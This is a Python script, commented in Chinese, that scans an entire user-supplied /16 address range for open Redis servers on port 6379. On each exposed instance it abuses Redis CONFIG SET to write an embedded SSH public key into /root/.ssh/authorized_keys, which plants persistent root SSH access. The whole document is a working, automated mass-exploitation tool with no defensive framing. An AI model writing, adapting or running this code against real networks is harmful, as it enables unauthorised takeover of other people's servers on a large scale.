#!/py3/bin/python3
# encoding:utf-8

import socket,threadpool,time
from redis import StrictRedis

success_list = []
socket.setdefaulttimeout(0.5)  # 设置socker超时，单位秒
key_pub = '''



ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQDBYBvJk2/4xXzyXBvTid0m/wXiu5CPkjB8Rv0kfSjc6V+Pz+ogVCPA+TntvJmZV8FeljEdJ63b2kmsHRm3TVqZB2TYyJ8Q1OdJ0Uryua7btQF4U/3vENnaFEzExsfFoANzq3V0kcYqnh9w7Qj02CcqIJikuLCIKisvHOaKEAfkMw== root@localhost.localdomain




'''


def get_port_status(ip, port=6379):
    time.sleep(0.1)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # SOCK_DGRAM是udp协议,STREAM是tcp协议
    try:
        server.connect((ip, port))
        success_list.append(ip)
    except  Exception as err:
        #print(err)
        pass
    finally:
        server.close()


def start_redis(ip):
    r = StrictRedis(host=ip, socket_timeout=0.5)
    try:
        key_info = r.set('key', key_pub)
        dir_info = r.config_set('dir','/root/.ssh')
        if key_info is True and dir_info is True:
            respon = r.keys()
            if respon != b'OK':
                r.config_set('dbfilename','authorized_keys')
                r.save()
                print('\033[0;33;44m Ok \033[0m')
                redis_success.append(ip)
            else:
                print('false')
    except:
        print('false')
        pass




if __name__ == '__main__':
    #start_ip = '39.104.'
    start_ip = str(input('input start ip >>: ')) + '.'
    ip_addr = []
    redis_success = []
    print("please wait...")
    for three_ip in range(0, 256):
        for end_ip in range(0, 255):
            ip = start_ip + str(three_ip) + '.' + str(end_ip)
            ip_addr.append(ip)             #生成所有ip地址

    pool = threadpool.ThreadPool(1004)
    check_port = threadpool.makeRequests(get_port_status, ip_addr)  # 开启多线程
    for req in check_port:
        pool.putRequest(req)
    pool.wait()                        #等待线程结束

    for data in success_list:       #测试redis
        print(data,end='...')
        start_redis(data)

    print('成功IP共%s个:\n'%(len(redis_success)),redis_success)

